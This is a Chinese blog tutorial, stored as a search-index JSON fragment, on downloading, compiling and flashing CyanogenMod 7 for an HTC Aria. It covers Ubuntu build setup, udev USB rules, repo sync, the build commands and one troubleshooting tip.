CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1\u662f\u4e00\u4e2a\u8017\u65f6\u3001\u8017\u7cbe\u529b\u3001\u8017\u4eba\u54c1\u7684\u5de5\u7a0b\uff0c\u5982\u679c\u4f60\u6709\u8db3\u591f\u7684\u6bc5\u529b\u3001\u8010\u5fc3\uff0c\u4ee5\u53ca\u505a\u597d\u4e86\u627f\u53d7\u5404\u79cd\u4e0b\u8f7d\u51fa\u9519\u3001\u7f16\u8bd1\u51fa\u9519\u3001\u56fa\u5316\u51fa\u9519\u6253\u51fb\u7684\u5fc3\u7406\u51c6\u5907\uff0c\u8bf7\u4e00\u6b65\u4e00\u6b65\u5f80\u4e0b\u770b\u3002\u8003\u8651\u5230Cyanogenmod\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u6709\u9650\uff0c\u4ee5\u53ca\u5e7f\u5927Android\u7f16\u7a0b\u7231\u597d\u8005\u7684\u624b\u673a\u8bbe\u5907\u5dee\u5f02\uff0c\u672cblog\u662f\u4ee5\u624b\u673aHTC Aria(liberty) \u4e0b\u8f7d\u3001\u7f16\u8bd1Cyanogenmod 7 \u3001\u5e76\u751f\u6210\u56fa\u4ef6\u70e7\u5199\u5230\u624b\u673a\u4e3a\u4f8b\uff0c\u5f15\u5bfc\u8bfb\u8005\u6839\u636e\u81ea\u5df1\u7684\u624b\u673a\u8bbe\u5907\u9009\u62e9\u5176\u652f\u6301\u7684Cyanogenmod\u7248\u672c\u4ee5\u53ca\u5176\u6e90\u7801\u5206\u652f\u8fdb\u884cCyanogenmod\u6e90\u7801\u7684\u4e0b\u8f7d\u3001\u7f16\u8bd1\u3001\u56fa\u5316\u3002 Ps.\u7b14\u8005\u67e5\u770b\u5404\u79cd\u8d44\u6599\uff0c\u4eceCyanogenmod\u662f\u4ec0\u4e48\u90fd\u4e0d\u77e5\u9053\u5230\u6700\u7ec8\u6210\u529f\u4e0b\u8f7dCyanogenmod\u6e90\u7801\u3001\u7f16\u8bd1\u3001\u751f\u6210\u56fa\u4ef6\u3001\u5728\u624b\u673a\u4e0a\u8fd0\u884cCM7\u7cfb\u7edf\u5171\u6298\u817e\u4e861\u4e2a\u661f\u671f\u3002\u5176\u4e2d\u4e0b\u8f7d\u6e90\u7801\u8017\u65f63\u5929\uff0c\u6bcf\u5929\u665a\u4e0a\u534a\u591c\u722c\u8d77\u6765\u770b\u662f\u5426\u5168\u90e8\u4e0b\u8f7d\u5b8c\u6210\u3002\u7f16\u8bd13\u5929\uff0c\u5305\u62ec\u5904\u7406\u5404\u79cd\u7f16\u8bd1\u51fa\u9519\uff0c\u751f\u6210\u56fa\u4ef6\u5e76\u8fd0\u884c\u7cfb\u7edf\u5e76\u5229\u7528\u8be5\u7cfb\u7edf\u62e8\u6253\u7b2c\u4e00\u4e2a\u7535\u8bdd\u6210\u529f\u65f6\uff0c\u5174\u594b\u4e4b\u60c5\u65e0\u4ee5\u8a00\u8868\uff0c\u5386\u53f2\u7684\u4e00\u523b\uff0c\u5c31\u50cf\u4e2d\u56fd\u53d1\u9001\u7b2c\u4e00\u5c01\u56fd\u9645\u7535\u5b50\u90ae\u4ef6\u4e00\u6837\u5f00\u542f\u4e2d\u56fd\u4e92\u8054\u7f51\u65f6\u4ee3\uff0c\u5f00\u542f\u4e86\u81ea\u5df1\u7684Android\u7cfb\u7edf\u6df1\u5165\u5b66\u4e60\u4e4b\u8def\uff0c\u8fd9\u8fd8\u53ea\u662f\u5f00\u59cb\uff0c\u540e\u9762\u7684\u8def\u8fd8\u5f88\u957f\u3002 \u4e00\u3001Cyanogenmod 1\u3001Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907 Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u7c7b\u578b\u6709Htc\u3001Samsung\u3001Huawei\u3001Sony\u7b49\u5176\u5404\u81ea\u65d7\u4e0b\u7684\u4e3b\u6d41\u578b\u53f7\uff0c\u8be6\u7ec6\u7684\u4fe1\u606f\u8bf7\u67e5\u9605Cyanogenmod\u5b98\u65b9\u7f51\u5740\uff1a http://wiki.cyanogenmod.org/w/Devices#vendor=; ,\u53ef\u4ee5\u67e5\u770bCyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u3002 \u5728vendor\u6807\u7b7e\u4e2d\u9009\u4e2dHtc\uff0c\u53ef\u770b\u5230\u7b14\u8005\u7684\u624b\u673aHTC Aria(liberty),\u8868\u660e\u652f\u6301Cyanogenmod\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u67e5\u770b\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7\u76f4\u63a5\u5173\u7cfb\u5230CM\u6e90\u7801\u5206\u652f\u7684\u9009\u62e9\uff0c\u6bd4\u5982\u7b14\u8005\u624b\u673a\u662fHTC liberty\uff0c\u5176\u652f\u6301\u7684CM\u7248\u672c\u53f7\u662fCM 7\uff0c\u5176\u5bf9\u5e94\u7684\u5206\u652f\u662fgingerbread\u3002 CM Support: 7 Latest CM version: gingerbread \u4e86\u89e3\u5b8c\u81ea\u5df1\u7684\u624b\u673a\u662f\u5426\u652f\u6301Cyanogenmod\u6e90\u7801\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\u548c\u5176\u652f\u6301\u7684CM version\u3002\u63a5\u4e0b\u6765\u5c31\u5f00\u59cb\u642d\u5efa\u73af\u5883\u3001\u4e0b\u8f7d\u3001\u7f16\u8bd1CM\u6e90\u7801\u4e86\u3002 \u4e8c\u3001\u73af\u5883\u642d\u5efa 1\u3001 ubuntu\u7cfb\u7edf\u5b89\u88c5 \u7b14\u8005\u7f16\u8bd1\u7684\u662fCyanogenMod 7\u7a33\u5b9a\u7248\u3001Android\u6e90\u78012.3\u7cfb\u5217\uff0c\u800cAndroid 2.3\u7cfb\u7edf\u9650\u5236\u5fc5\u987b\u4f7f\u752832\u4f4d\uff08Android4\u652f\u630164\u4f4d\u7cfb\u7edf\uff09\uff0c\u6545\u4f7f\u7528ubuntu10.3 32\u4f4d\u7cfb\u7edf\u3002\u8be6\u7ec6\u5b89\u88c5\u6b65\u9aa4\u8bf7\u53c2\u8003\u7f51\u4e0a\u7684\u5b89\u88c5\u6559\u7a0b\uff0c\u5df2\u5b89\u88c5ubuntu 32\u4f4d\u7cfb\u7edf\u8bf7\u8df3\u8fc7\u3002 2\u3001 \u5b89\u88c5JDK6 $ sudo add-apt-repository \"deb http://archive.canonical.com/ lucid partner\" $ sudo apt-get update $ sudo apt-get installsun-java6-jdk 3\u3001 \u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305 (Ubuntu 10.04-- 11.10) $ sudo apt-get installgit-core gnupg flex bison gperf build-essential \\ zip curl zlib1g-dev libc6-devlib32ncurses5-dev ia32-libs \\ x11proto-core-dev libx11-devlib32readline5-dev lib32z-dev \\ libgl1-mesa-dev g++-multilib mingw32 tofrodospython-markdown \\ libxml2-utils xsltproc Ubuntu 12.04\u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html 4\u3001 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 (1)\u3001\u9ed8\u8ba4\u5c06htc\u7c7b\u578b\u624b\u673a\u901a\u8fc7usb\u8fde\u63a5\u4e0a\u7535\u8111\u4e4b\u540e\uff0c\u4f7f\u7528adb devices\u662f\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u624b\u673a\u8bbe\u5907\u7684\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a tip\uff1a\u8fd9\u91cc\u8981\u4f7f\u7528\u5230adb\u5de5\u5177\uff0c\u5982\u679cubuntu\u7cfb\u7edf\u5b89\u88c5\u4e86android eclipse\u5f00\u53d1\u5de5\u5177\uff0c\u9ed8\u8ba4\u662f\u81ea\u5e26adb\u5de5\u5177\u7684\u3002 (2)\u3001\u5c06\u8bbe\u5907\u8fde\u63a5\u4e0a\u7535\u8111\uff0c\u67e5\u770b\u624b\u673a\u7684usb\u8bbe\u5907\uff1a ubuntu@andy-laptop:~$lsusb htc \u624b\u673a\u5bf9\u5e94\u7684usb\u8bbe\u5907\u4fe1\u606f\u5982\u4e0b\uff1a Bus 002 Device 004: ID 0bb4:0c92 High Tech Computer Corp. \u5982\u4e0b\u56fe\u6240\u793a\uff1a (3)\u3001\u4fee\u653951-android.rules\u6587\u4ef6\uff1a ubuntu@andy-laptop:sudo gedit /etc/udev/rules.d/51-android.rules \u6dfb\u52a0\u4e00\u884c\u4fe1\u606f\uff0c\u7279\u522b\u6ce8\u610f\uff0cATTR{idVendor} \u4e0eATTR{idProduct}\u7684\u503c\u5206\u522b\u4e8eID 0bb4:0c92\u5bf9\u5e94\u3002 # fastboot protocol onmanta (htc liberty) SUBSYSTEM==\"usb\",ATTR{idVendor}==\"0bb4\", ATTR{idProduct}==\"0c92\",MODE=\"0600\", OWNER=\"ubuntu\" \u5982\u4e0b\u56fe\u6240\u793a\uff1a (4)\u3001\u4fdd\u5b58\u6587\u4ef6\u540e\uff0c\u91cd\u65b0\u5c06\u624b\u673a\u8fde\u63a5\u5230\u7535\u8111\uff0c\u4f7f\u7528adb devices\u67e5\u770b\u8bbe\u5907\u7684\u8fde\u63a5\u72b6\u6001\uff0c\u53ef\u53d1\u73b0\u5df2\u7ecf\u62e5\u6709\u4e86\u8bbf\u95eeusb\u7684\u6743\u9650\u3002 (5)\u3001\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html Configuring USB Access\u5c0f\u8282 \u4e09\u3001\u4e0b\u8f7d\u6e90\u7801 1\u3001 \u5b89\u88c5Repo //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u5f00\u59cb $ mkdir ~/bin $ PATH=~/bin:$PATH $ curl http://commondatastorage.googleapis.com/git-repo-downloads/repo > ~/bin/repo $ chmod a+x ~/bin/repo 2\u3001\u4e0b\u8f7d\u6e90\u7801 (1)\u3001 \u5982\u4f55\u9009\u62e9\u5206\u652f \u7b14\u8005\u7684\u624b\u673a\u662fhtc G9,\u652f\u6301\u7684CM verison :gingerbread\uff0c\u9009\u62e9\u624b\u673a\u8bbe\u5907\u6240\u652f\u6301\u5206\u652f\u7684\u8be6\u7ec6\u6b65\u9aa4\uff0c\u8bf7\u53c2\u8003\u672cblog 1.2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u7b14\u8005\u6700\u7ec8\u9009\u62e9\u7684\u5206\u652f\u662f\uff1agingerbread-release \u67e5\u770b https://github.com/CyanogenMod/android.git \u4e0b\u6240\u652f\u6301\u7684\u6240\u6709\u5206\u652f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u662f\u5206\u652fgingerbread-release\u3002 (2)\u3001\u4f7f\u7528repo\u6267\u884c\u4e0b\u8f7d //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u4e0b\u5f00\u59cb,\u5206\u522b\u521b\u5efa\u6587\u4ef6\u5939CyanogenMod/android/CM-7 $cd ./CyanogenMod/android/CM-7 //\u83b7\u53d6gingerbread-release\u7684\u5206\u652f\u6e90\u4ee3\u7801 $repo init -u git://github.com/CyanogenMod/android.git -b gingerbread-release //\u540c\u6b65\u670d\u52a1\u5668\u4ee3\u7801\u5230\u672c\u5730\uff0c-j16\u636e\u7f51\u53cb\u53cd\u5e94\u662f\u591a\u5f00\u7f51\u7edc\u8fde\u63a5\uff0c\u4ece\u800c\u80fd\u63d0\u9ad8\u4e0b\u8f7d\u901f\u5ea6 $repo sync -j16 repo\u547d\u4ee4\u4f7f\u7528\u53c2\u8003\uff1a http://source.android.com/source/using-repo.html \u7279\u522b\u63d0\u9192\uff1a\u5173\u4e8egingerbread\u5206\u652f\uff0c\u6211\u4e0b\u8f7d\u4e4b\u540e\uff0c\u53d1\u73b0CyanogenMod/android/CM-7/device\u76ee\u5f55\u91cc\u6ca1\u6709htc\u3001\u4e09\u661f\u4e00\u7cfb\u5217\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\uff0c\u6298\u817e\u4e86\u597d\u957f\u4e00\u6bb5\u65f6\u95f4\uff0c\u6700\u7ec8\u9009\u62e9gingerbread-release\u5206\u652f\u4e0b\u8f7d\u6e90\u7801\uff0c\u5728CyanogenMod/android/CM-7/device\u76ee\u5f55\u6210\u529f\u83b7\u5f97\u591a\u6b3e\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\u3002 \u4e0b\u8f7d\u6210\u529f\u540e\uff0c\u5728CyanogenMod/android/CM-7/device\u6587\u4ef6\u5939\u4f1a\u5305\u542b\u5982\u4e0b\u6240\u793a\u6587\u4ef6\u5939\uff0c\u4ee5\u6b64\u5224\u65ad\u6e90\u7801\u662f\u5426\u4e0b\u8f7d\u5b8c\u6574\u3002\u53d1\u73b0device\u6587\u4ef6\u5939\u91cc\u5df2\u7ecf\u5305\u542b\u4e86htc\u6587\u4ef6\u5939\uff0c\u5982\u56fe\u6240\u793a\uff1a \u70b9\u51fbhtc\u6587\u4ef6\u5939\u8fdb\u5165\u53ef\u53d1\u73b0liberty\u5df2\u5b89\u9759\u7684\u8eba\u5728\u90a3\uff0c\u5982\u56fe\u6240\u793a\uff1a \u56db\u3001\u7f16\u8bd1\u6e90\u7801 1\u3001 \u8bfb\u53d6\u624b\u673a\u4e0a\u7684\u4e00\u4e9b\u79c1\u6709\u914d\u7f6e\u6587\u4ef6 \u5c06htc\u624b\u673a\u8fde\u63a5\u4e0aubuntu\u7cfb\u7edf\uff0c\u53ef\u80fd\u6ca1\u6709usb\u8bbf\u95ee\u6743\u9650\uff0c\u5177\u4f53\u8bf7\u53c2\u80032.4 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 $cd ~/CyanogenMod/android/CM-7/device/htc/liberty $./extract-files.sh 2\u3001 \u751f\u6210\u7f16\u8bd1\u811a\u672c\u6587\u4ef6 $cd ~/CyanogenMod/android/CM-7/vendor/cyanogen $./get-rommanager $./extract-google-files //\u590d\u5236\u7f16\u8bd1\u811a\u672c\u6587\u4ef6\u5230\u76ee\u5f55\u4e0b\uff0c\u540e\u9762\u7f16\u8bd1\u6574\u4e2a\u7cfb\u7edf\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6 $cp ~/CyanogenMod/android/CM-7/vendor/cyanogen/products/cyanogen_lieberty.mk ~/CyanogenMod/android/CM-7/buildspec.mk \u6267\u884c./get-rommanager\u8fd0\u884c\u7ed3\u679c\u5982\u56fe\u6240\u793a\uff1a 3\u3001 \u7f16\u8bd1\u811a\u672c \u56de\u5230CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\uff0c\u6267\u884c\u811a\u672c\u3002 //\u521d\u59cb\u5316\u811a\u672c\uff0c\u8fd9\u4e2a\u662f\u540e\u9762\u7684\u91cd\u8981\u57fa\u7840\u6b65\u9aa4 $cd ~/CyanogenMod/android/CM-7 $source build/envsetup.sh //\u9009\u62e9\u7f16\u8bd1\u7684\u4ea7\u54c1\uff0c\u8fd9\u4e2a\u547d\u4ee4\u9700\u8981\u4e00\u5c0f\u4f1a\u513f\u65f6\u95f4\uff0c\u4f46\u662f\u53c8\u6ca1\u63d0\u793a\uff0c\u8010\u6027\u7b49\u5f85\u4e00\u4e0b //\u6216\u76f4\u63a5\u6267\u884clunch\u547d\u4ee4\uff0c\u67e5\u770blist\u9009\u9879\u6765\u9009\u62e9\u6267\u884c\u54ea\u4e2a\u7248\u672c $lunch cyanogen_liberty-eng //\u5f00\u59cb\u7f16\u8bd1 $make -j4 CYANOGEN_WITH_GOOGLE=true otapackage \u6267\u884clunch\u547d\u4ee4\uff0c\u9009\u62e9119\uff0c\u663e\u793a\u4fe1\u606f\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7f16\u8bd1\u6210\u529f\u663e\u793a\u5982\u4e0b\u4fe1\u606f\uff0c\u8fd9\u5f20\u56fe\u7247\u6765\u7684\u76f8\u5f53\u4e0d\u5bb9\u6613\uff0c\u534a\u591c\u8d77\u6765\u622a\u7684\u56fe: 4\u3001\u7f16\u8bd1\u53ef\u80fd\u4ea7\u51fa\u7684\u9519\u8bef\u5206\u6790\uff08\u5982\u679c\u6ca1\u6709\u95ee\u9898\u53ef\u76f4\u63a5\u8df3\u8fc7\uff0c\u6267\u884c\u7b2c5\u6b65\uff1a\u751f\u6210\u5237\u673azip\u5305\u64cd\u4f5c\uff09\uff1a \u9519\u8bef\u539f\u56e0\uff1a\u65e0\u6cd5\u8bbf\u95ee\u6587\u4ef6: corrupted zip file \u9519\u8bef\u539f\u56e0\u5206\u6790\uff1a\u6ca1\u6709\u9009\u62e9\u6b63\u786ejar\u7248\u672c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u9009\u62e9\u7684\u662f/usr/bin/fastjar\u81ea\u52a8\u6a21\u5f0f\uff0c\u901a\u8fc7sudo update-alternatives --config jar\u9009\u62e9jdk6\u5373\u53ef\u3002 \u95ee\u9898\u89e3\u51b3\uff1a 32\u4f4dubuntu\u7f16\u8bd1android2.3,\u65e0\u6cd5\u8bbf\u95ee java.lang.Object\u95ee\u9898 http://hi.baidu.com/cmdmac/item/93920ff30164270884d278a4 \u7f16\u8bd1android 2.3.4\u7684\u4e00\u4e2a\u9519\u8bef http://blog.163.com/covel_zhang/blog/static/81641365201223122541768/ 5\u3001\u751f\u4ea7\u5237\u673azip\u5305\u3002 \u5728CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\u6267\u884c\u5982\u4e0b\u811a\u672c\uff1a $./vendor/cyanogen/tools/squisher \u751f\u6210\u56fa\u4ef6\u5305\u6210\u529f\uff0c\u663e\u793a\u5982\u4e0b\u56fe\u6240\u793a\u4fe1\u606f\uff1a \u4e94\u3001\u5237\u673a \u5c06cm-7-20131119-UNOFFCIAL-liberty.zip\u5305\u5237\u5230\u6211htc\u624b\u673a\u4e0a\u4e00\u5207\u6b63\u5e38\uff0c\u6709\u56fe\u6709\u771f\u76f8\uff0c\u7559\u5fc3\"\u5173\u4e8e\u624b\u673a\"\u4fee\u8ba2\u7248\u672c\u9009\u9879\uff0c\u6b63\u662f\u7b2c5\u6b65\u751f\u6210\u7684\u5237\u673a\u5305cm-7-20131119-UNOFFCIAL-liberty.zip\u3002 \u516d\u3001\u53c2\u8003\uff1a Android\u62d3\u5c55\u7cfb\u5217(5)--CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1(Android ROM\u5b9a\u5236\u57fa\u7840\u7bc7) Android \u7b2c\u4e09\u65b9ROM CyanogenMod \u6e90\u7801\u4e0b\u8f7d\uff0c\u7f16\u8bd1\uff0c\u5237\u673a http://source.android.com/source/initializing.html http://source.android.com/source/building.html \u4e03\u3001\u5c0f\u7ed3\uff1a \u672c\u6587\u4ee5\u7b14\u8005\u81ea\u8eab\u7684CyanogenMod\u6e90\u7801\u7f16\u8bd1\u6298\u817e\u7ecf\u5386\u63cf\u8ff0\u4e86\u5229\u7528\u7b2c\u4e09\u65b9\u5f00\u6e90\u7cfb\u7edf\u5b9a\u5236\u4e2a\u6027\u5316ROM\u7684\u8fc7\u7a0b\uff0c\u4e4b\u6240\u4ee5\u8981\u8bb0\u5f55\u8fd9\u7bc7\u535a\u6587\uff0c\u5b8c\u5168\u662f\u672c\u7740\u524d\u4eba\u683d\u6811\u540e\u4eba\u4e58\u51c9\u7684\u5b97\u65e8\uff0c\u8ba9\u9047\u5230\u540c\u6837\u9700\u6c42\u7684\u5f00\u53d1\u8005\u4e0d\u81f3\u4e8e\u50cf\u7b14\u8005\u5982\u6b64\u6298\u817e\uff0c\u6216\u8005\u8bf4\u6298\u817e\u7684\u5c11\u4e00\u4e9b\uff0c\u5982\u6b64\uff0c\u7b14\u8005\u5fc3\u6ee1\u610f\u8db3\u3002\u6700\u540e\uff0c\u672c\u535a\u6587\u867d\u7ecf\u7b14\u8005\u591a\u6b21\u6821\u9a8c\uff0c\u4f46\u96be\u514d\u4f1a\u6709\u758f\u6f0f\u4e4b\u5904\uff0c\u656c\u8bf7\u6307\u6b63\uff0c\u7b14\u8005\u5c06\u5728\u7b2c\u4e00\u65f6\u95f4\u7ed9\u4e88\u7b54\u590d\u6307\u6b63\u3002 \u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\uff1ahttp://blog.csdn.net/andie_guo/article/details/16879443 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/andie_guo/article/details/16879443","title":"\u3010Android ROM\u5b9a\u5236\u3011CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#android-romcyanogenmod","text":"","title":"\u3010Android ROM\u5b9a\u5236\u3011CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_1","text":"CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1\u662f\u4e00\u4e2a\u8017\u65f6\u3001\u8017\u7cbe\u529b\u3001\u8017\u4eba\u54c1\u7684\u5de5\u7a0b\uff0c\u5982\u679c\u4f60\u6709\u8db3\u591f\u7684\u6bc5\u529b\u3001\u8010\u5fc3\uff0c\u4ee5\u53ca\u505a\u597d\u4e86\u627f\u53d7\u5404\u79cd\u4e0b\u8f7d\u51fa\u9519\u3001\u7f16\u8bd1\u51fa\u9519\u3001\u56fa\u5316\u51fa\u9519\u6253\u51fb\u7684\u5fc3\u7406\u51c6\u5907\uff0c\u8bf7\u4e00\u6b65\u4e00\u6b65\u5f80\u4e0b\u770b\u3002\u8003\u8651\u5230Cyanogenmod\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u6709\u9650\uff0c\u4ee5\u53ca\u5e7f\u5927Android\u7f16\u7a0b\u7231\u597d\u8005\u7684\u624b\u673a\u8bbe\u5907\u5dee\u5f02\uff0c\u672cblog\u662f\u4ee5\u624b\u673aHTC Aria(liberty) \u4e0b\u8f7d\u3001\u7f16\u8bd1Cyanogenmod 7 \u3001\u5e76\u751f\u6210\u56fa\u4ef6\u70e7\u5199\u5230\u624b\u673a\u4e3a\u4f8b\uff0c\u5f15\u5bfc\u8bfb\u8005\u6839\u636e\u81ea\u5df1\u7684\u624b\u673a\u8bbe\u5907\u9009\u62e9\u5176\u652f\u6301\u7684Cyanogenmod\u7248\u672c\u4ee5\u53ca\u5176\u6e90\u7801\u5206\u652f\u8fdb\u884cCyanogenmod\u6e90\u7801\u7684\u4e0b\u8f7d\u3001\u7f16\u8bd1\u3001\u56fa\u5316\u3002 Ps.\u7b14\u8005\u67e5\u770b\u5404\u79cd\u8d44\u6599\uff0c\u4eceCyanogenmod\u662f\u4ec0\u4e48\u90fd\u4e0d\u77e5\u9053\u5230\u6700\u7ec8\u6210\u529f\u4e0b\u8f7dCyanogenmod\u6e90\u7801\u3001\u7f16\u8bd1\u3001\u751f\u6210\u56fa\u4ef6\u3001\u5728\u624b\u673a\u4e0a\u8fd0\u884cCM7\u7cfb\u7edf\u5171\u6298\u817e\u4e861\u4e2a\u661f\u671f\u3002\u5176\u4e2d\u4e0b\u8f7d\u6e90\u7801\u8017\u65f63\u5929\uff0c\u6bcf\u5929\u665a\u4e0a\u534a\u591c\u722c\u8d77\u6765\u770b\u662f\u5426\u5168\u90e8\u4e0b\u8f7d\u5b8c\u6210\u3002\u7f16\u8bd13\u5929\uff0c\u5305\u62ec\u5904\u7406\u5404\u79cd\u7f16\u8bd1\u51fa\u9519\uff0c\u751f\u6210\u56fa\u4ef6\u5e76\u8fd0\u884c\u7cfb\u7edf\u5e76\u5229\u7528\u8be5\u7cfb\u7edf\u62e8\u6253\u7b2c\u4e00\u4e2a\u7535\u8bdd\u6210\u529f\u65f6\uff0c\u5174\u594b\u4e4b\u60c5\u65e0\u4ee5\u8a00\u8868\uff0c\u5386\u53f2\u7684\u4e00\u523b\uff0c\u5c31\u50cf\u4e2d\u56fd\u53d1\u9001\u7b2c\u4e00\u5c01\u56fd\u9645\u7535\u5b50\u90ae\u4ef6\u4e00\u6837\u5f00\u542f\u4e2d\u56fd\u4e92\u8054\u7f51\u65f6\u4ee3\uff0c\u5f00\u542f\u4e86\u81ea\u5df1\u7684Android\u7cfb\u7edf\u6df1\u5165\u5b66\u4e60\u4e4b\u8def\uff0c\u8fd9\u8fd8\u53ea\u662f\u5f00\u59cb\uff0c\u540e\u9762\u7684\u8def\u8fd8\u5f88\u957f\u3002","title":"\u524d\u8a00\uff1a"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#cyanogenmod","text":"1\u3001Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907 Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u7c7b\u578b\u6709Htc\u3001Samsung\u3001Huawei\u3001Sony\u7b49\u5176\u5404\u81ea\u65d7\u4e0b\u7684\u4e3b\u6d41\u578b\u53f7\uff0c\u8be6\u7ec6\u7684\u4fe1\u606f\u8bf7\u67e5\u9605Cyanogenmod\u5b98\u65b9\u7f51\u5740\uff1a http://wiki.cyanogenmod.org/w/Devices#vendor=; ,\u53ef\u4ee5\u67e5\u770bCyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u3002 \u5728vendor\u6807\u7b7e\u4e2d\u9009\u4e2dHtc\uff0c\u53ef\u770b\u5230\u7b14\u8005\u7684\u624b\u673aHTC Aria(liberty),\u8868\u660e\u652f\u6301Cyanogenmod\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u67e5\u770b\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7\u76f4\u63a5\u5173\u7cfb\u5230CM\u6e90\u7801\u5206\u652f\u7684\u9009\u62e9\uff0c\u6bd4\u5982\u7b14\u8005\u624b\u673a\u662fHTC liberty\uff0c\u5176\u652f\u6301\u7684CM\u7248\u672c\u53f7\u662fCM 7\uff0c\u5176\u5bf9\u5e94\u7684\u5206\u652f\u662fgingerbread\u3002 CM Support: 7 Latest CM version: gingerbread \u4e86\u89e3\u5b8c\u81ea\u5df1\u7684\u624b\u673a\u662f\u5426\u652f\u6301Cyanogenmod\u6e90\u7801\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\u548c\u5176\u652f\u6301\u7684CM version\u3002\u63a5\u4e0b\u6765\u5c31\u5f00\u59cb\u642d\u5efa\u73af\u5883\u3001\u4e0b\u8f7d\u3001\u7f16\u8bd1CM\u6e90\u7801\u4e86\u3002","title":"\u4e00\u3001Cyanogenmod"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_2","text":"1\u3001 ubuntu\u7cfb\u7edf\u5b89\u88c5 \u7b14\u8005\u7f16\u8bd1\u7684\u662fCyanogenMod 7\u7a33\u5b9a\u7248\u3001Android\u6e90\u78012.3\u7cfb\u5217\uff0c\u800cAndroid 2.3\u7cfb\u7edf\u9650\u5236\u5fc5\u987b\u4f7f\u752832\u4f4d\uff08Android4\u652f\u630164\u4f4d\u7cfb\u7edf\uff09\uff0c\u6545\u4f7f\u7528ubuntu10.3 32\u4f4d\u7cfb\u7edf\u3002\u8be6\u7ec6\u5b89\u88c5\u6b65\u9aa4\u8bf7\u53c2\u8003\u7f51\u4e0a\u7684\u5b89\u88c5\u6559\u7a0b\uff0c\u5df2\u5b89\u88c5ubuntu 32\u4f4d\u7cfb\u7edf\u8bf7\u8df3\u8fc7\u3002 2\u3001 \u5b89\u88c5JDK6 $ sudo add-apt-repository \"deb http://archive.canonical.com/ lucid partner\" $ sudo apt-get update $ sudo apt-get installsun-java6-jdk 3\u3001 \u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305 (Ubuntu 10.04-- 11.10) $ sudo apt-get installgit-core gnupg flex bison gperf build-essential \\ zip curl zlib1g-dev libc6-devlib32ncurses5-dev ia32-libs \\ x11proto-core-dev libx11-devlib32readline5-dev lib32z-dev \\ libgl1-mesa-dev g++-multilib mingw32 tofrodospython-markdown \\ libxml2-utils xsltproc Ubuntu 12.04\u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html 4\u3001 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 